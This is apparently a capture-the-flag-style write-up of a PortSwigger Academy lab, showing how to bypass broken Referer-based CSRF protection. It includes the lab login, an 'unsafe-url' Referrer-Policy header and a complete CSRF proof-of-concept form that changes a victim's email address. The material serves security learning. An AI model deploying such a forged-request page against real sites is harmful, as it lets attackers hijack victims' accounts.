## Welcome, my friend. Today we will start the [12. CSRF lab](https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-can-be-circumvented/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken) in ```portswigger```

### Let's play this lab:

![image](https://github.com/user-attachments/assets/5c11b51d-639d-423b-a4f6-f808d93db48d)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/c5e8140f-1921-45a7-904d-2c57fc3402ed)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/7f0eeda5-4aca-4e8e-9c28-74faa0a27f28)

#### Let's update email to ```0xT0R@gmail.com```:

![image](https://github.com/user-attachments/assets/163d3534-fe57-444c-8232-e43c586bc003)

#### We need do this task but through our victim by CSRF, we should intercept this request of update email by burp suite.

![image](https://github.com/user-attachments/assets/3b997135-0203-4670-b5a9-fe1d4c0512e0)

### Add ```Referrer-Policy``` header:

```
Referrer-Policy: unsafe-url
```

![image](https://github.com/user-attachments/assets/3741fb46-8cf8-4388-a5af-4c0e5558f403)


### this csrf PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
 <script>
history.pushState("", "", "/?0a450070038cd698804ae9b600bd0041.web-security-academy.net")
    </script>
    <form action="https://0a450070038cd698804ae9b600bd0041.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="haching&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
   
  </body>
</html>

```

![image](https://github.com/user-attachments/assets/824541f6-8169-4d75-b3d5-d031c47e9786)


-------

### Done! Congratulations, friends‚ù§Ô∏è‚Äçüî•


<p align="center">
<img src="https://github.com/user-attachments/assets/cb0eebf1-ffe1-4366-924b-707c447ca6a3" >
</p>
